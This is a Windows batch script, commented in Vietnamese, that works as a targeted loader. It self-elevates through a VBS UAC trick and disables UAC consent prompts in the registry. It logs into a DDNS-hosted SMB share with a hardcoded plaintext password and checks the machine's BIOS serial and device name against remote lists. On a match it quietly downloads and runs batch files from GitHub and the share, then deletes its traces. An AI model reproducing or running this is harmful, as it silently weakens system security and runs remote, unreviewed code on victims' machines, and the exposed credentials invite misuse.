@echo off
setlocal EnableDelayedExpansion
echo wait 30s
ping 127.0.0.1 -n 30
:: --- Yêu cầu UAC ---
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (
    echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %*", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f

:: ----------------------------------------
:: TẢI FILE CHECK.TXT TỪ GITHUB
:: ----------------------------------------
set "url=https://raw.githubusercontent.com/mitutina/mitutina/main/check.txt"
set "tempfile1=%temp%\check.txt"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%tempfile1%')"
if not exist "%tempfile1%" (
    echo [GitHub] Khong tai duoc file.
)

:: -----------------------------------------------------------
:: TẢI FILE CHECK.TXT TỪ NETWORK SHARE (không dùng ổ đĩa ánh xạ)
:: -----------------------------------------------------------
set "uncPath=\\minhtuan283.ddns.net\hdd25\serial\check.txt"
set "tempfile2=%temp%\check2.txt"

REM Thử đăng nhập với user minhtuan283 trước
net use \\minhtuan283.ddns.net\hdd25 /user:minhtuan283 Thienngan2002 /persistent:no >nul 2>&1

REM Nếu đăng nhập với user đầu tiên không thành công, thử user thứ hai
if errorlevel 1 (
    echo [Network] Dang nhap voi user minhtuan283 that bai, thu voi user giabao...
    net use \\minhtuan283.ddns.net\hdd25 /user:giabao Thienngan2002 /persistent:no >nul 2>&1
)

if errorlevel 1 (
    echo [Network] Khong ket noi duoc toi share.
) else (
    copy "%uncPath%" "%tempfile2%" >nul 2>&1
)

if not exist "%tempfile2%" (
    echo [Network] Khong tai duoc file.
)

:: Nếu cả 2 file đều không tải được -> chuyển qua :cleanup
if not exist "%tempfile1%" if not exist "%tempfile2%" (
    echo Khong tai duoc file nao ca.
    goto :cleanup
)

:: ----------------------------------------
:: LẤY SERIAL NUMBER VÀ DEVICE NAME
:: ----------------------------------------
for /f "tokens=*" %%i in ('powershell -Command "(Get-CimInstance -ClassName Win32_BIOS).SerialNumber.Trim()"') do set "serial=%%i"
for /f "tokens=*" %%i in ('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).Name.Trim()"') do set "device=%%i"

echo Serial Number: %serial%
echo Device Name: %device%

:: ----------------------------------------
:: SO SÁNH NỘI DUNG CỦA CÁC FILE
:: ----------------------------------------
set "found=0"

if exist "%tempfile1%" (
    echo Noi dung file GitHub:
    type "%tempfile1%"
    for /f "delims=" %%j in ('type "%tempfile1%"') do (
        if /i "%%j"=="%serial%" set "found=1"
        if /i "%%j"=="%device%" set "found=1"
    )
)

if exist "%tempfile2%" (
    echo Noi dung file Network:
    type "%tempfile2%"
    for /f "delims=" %%j in ('type "%tempfile2%"') do (
        if /i "%%j"=="%serial%" set "found=1"
        if /i "%%j"=="%device%" set "found=1"
    )
)

if %found%==0 (
    echo Khong trung khop voi file nao ca.
    goto :cleanup
) else (
    echo Trung khop. Thuc hien cac lenh tiep theo...
    rem -- Thực hiện các lệnh khác của bạn --
    
  start /min powershell -Command "$url1 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.bat'; $tempPath1 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup.bat'); Invoke-WebRequest -Uri $url1 -OutFile $tempPath1; Start-Process $tempPath1 -Wait; Remove-Item $tempPath1"
rem   start /min powershell -Command "$url2 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup2.bat'; $tempPath2 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup2.bat'); Invoke-WebRequest -Uri $url2 -OutFile $tempPath2; Start-Process $tempPath2 -Wait; Remove-Item $tempPath2"
rem start /min powershell -Command "$url3 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup3.bat'; $tempPath3 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup3.bat'); Invoke-WebRequest -Uri $url3 -OutFile $tempPath3; Start-Process $tempPath3 -Wait; Remove-Item $tempPath3"
rem start /min powershell -Command "$url4 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup4.bat'; $tempPath4 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup4.bat'); Invoke-WebRequest -Uri $url4 -OutFile $tempPath4; Start-Process $tempPath4 -Wait; Remove-Item $tempPath4"
rem start /min powershell -Command "$url5 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup5.bat'; $tempPath5 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup5.bat'); Invoke-WebRequest -Uri $url5 -OutFile $tempPath5; Start-Process $tempPath5 -Wait; Remove-Item $tempPath5"
rem powershell curl -o C:\Windows\System32\WindowsPowerShell\windows-backup.ps1 https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.ps1
rem powershell -ExecutionPolicy Bypass -File "C:\Windows\System32\WindowsPowerShell\windows-backup.ps1"

rem powershell -Command "curl -o C:\Windows\System32\WindowsPowerShell\windows-backup.ps1 https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.ps1; powershell -ExecutionPolicy Bypass -File 'C:\Windows\System32\WindowsPowerShell\windows-backup.ps1'"
copy "\\minhtuan283.ddns.net\hdd25\serial\script\a.bat" "%temp%\a.bat" >nul 2>&1
call "%temp%\a.bat"
)

:cleanup
if exist "%tempfile1%" del "%tempfile1%"
if exist "%tempfile2%" del "%tempfile2%"
set "url="
set "tempfile1="
set "tempfile2="
set "serial="
set "device="
set "found="
if exist "%temp%\a.bat" del /f /q "%temp%\a.bat"
net use \\minhtuan283.ddns.net\hdd25 /delete >nul 2>&1
echo Hoan Thanh.
exit /b
